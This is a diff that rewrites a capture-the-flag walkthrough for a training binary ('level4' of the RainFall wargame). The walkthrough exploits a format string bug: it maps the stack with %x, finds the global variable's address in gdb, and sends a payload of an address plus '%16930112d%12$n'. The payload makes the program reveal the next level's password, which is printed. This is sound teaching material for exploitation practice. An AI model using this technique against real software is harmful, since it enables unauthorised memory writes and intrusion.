@@ -1,10 +1,8 @@
-# Level 4 — Format String Vulnerability (Large Write via Padding)
+# level4
 
-## Introduction
-This level extends the format string vulnerability concepts from Level 3. Here, we must write a very large value to a global variable `m` to spawn a shell. Because our input length is limited by `fgets`, we must use `printf`'s width formatting flags to generate the required number of characters in memory.
+Let's analyze the code.
 
-## Analysis
-The reconstructed C code of the binary is:
+Here is the reconstructed C code of the binary:
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -12,16 +10,17 @@ The reconstructed C code of the binary is:
 int m = 0;
 
 void p(char *param_1) {
-    printf(param_1); // Vulnerable printf
+    printf(param_1);
 }
 
 void n(void) {
     char local_20c[520];
     
-    fgets(local_20c, 520, stdin);
+    fgets(local_20c, 0x200, stdin);
+    
     p(local_20c);
     
-    if (m == 0x1025544) { // 0x1025544 is 16930116 in decimal
+    if (m == 0x1025544) {
         system("/bin/cat /home/user/level5/.pass");
     }
 }
@@ -32,50 +31,60 @@ int main(void) {
 }
 ```
 
-### The Problem and Strategy
-We need to overwrite the global variable `m` to equal `16930116`. However, the `fgets` function restricts our input length to 520 bytes, meaning we cannot feed `16930116` characters directly. 
+The `main` function calls `n`, which gets our input via `fgets` and passes it to `p`, where `printf` is called with the same format string vulnerability as the previous level. The only difference is the value we are comparing against: `0x1025544`.
 
-To bypass this limit, we use `printf`'s width formatting (e.g. `%16930112d`), which instructs the program to output `16930112` padding spaces without requiring them to be present in our input string.
+In decimal, `0x1025544` is `16930116`.
 
-### Finding the Address of `m`
-We use `gdb` to find the address of the global variable `m`:
-```gdb
-(gdb) info variable m
-All variables matching regular expression "m":
+This is a very large number—too large to write out literally in the input buffer because the buffer size is capped by `fgets` at `0x200` (512 bytes).
 
-Non-debugging symbols:
+So how can we print `16930116` characters without writing them down literally?
+
+We can use `printf`'s width formatting flags. For example, if we need to print spaces before a number, instead of writing them manually:
+```c
+printf("%10d", 42);
+```
+This outputs `42` padded to a total width of 10 characters: `'          42'`.
+We can use this trick with our parameter selector (`$`) and `%n` to accomplish this.
+
+### Stack Mapping and Address Analysis
+
+Let's explore the stack first:
+```bash
+level4@RainFall:~$ ./level4 
+aaaa %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
+aaaa b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 ...
+```
+We see that `61616161` (`aaaa`) appears at the **12th** argument position on the stack.
+
+Next, we check the global variable `m`'s address in GDB:
+```text
+(gdb) info variables m
+All defined variables:
+...
 0x08049810  m
 ```
+
 The address of `m` is `0x08049810`.
 
-### Finding the Stack Offset
-We print a distinct marker `aaaa` followed by multiple `%x` format specifiers:
-```bash
-level4@RainFall:~$ ./level4
-aaaa %x %x %x %x %x %x %x %x %x %x %x %x
-aaaa b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 61616161
-```
-`61616161` (hex representation of `aaaa`) appears as the **12th** output. This indicates that the start of our input buffer resides at argument position **12** on the stack.
+### Building the Payload
+- Target Address of `m`: `0x08049810`
+- Target Value: `16930116`
+- Stack Offset: `12`
 
-### Designing the Payload
-To write `16930116` to `m`:
-1. Start the payload with the target address `0x08049810` (4 bytes).
-2. Print `16930112` characters using a width specifier (since `16930116 - 4 = 16930112`).
-3. Use `%12$n` to write the printed character count to the address at the 12th position on the stack.
+We place the 4-byte address of `m` at the beginning of our input string.
+We need `16930116` characters printed in total. Since the address occupies 4 bytes, we need `16930116 - 4 = 16930112` characters of padding.
+Then we use `%12$n` to write this count to the address at position 12.
 
-## Exploit
-We generate the payload (reversing the address to little-endian representation `\x10\x98\x04\x08`):
+Using `[::-1]` to write the target address in little-endian format, we build the payload command:
 ```bash
-python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' > /tmp/payload
+python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112d" + "%12$n"' > payload
 ```
 
-Run the exploit:
+And run the exploit:
 ```bash
-(cat /tmp/payload; cat) | ./level4
+(cat payload; cat) | ./level4
 ```
-
-This prints the flag for `level5` to stdout:
+This prints the password for `level5`:
 ```
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 ```
-We save this password to proceed to `level5`.
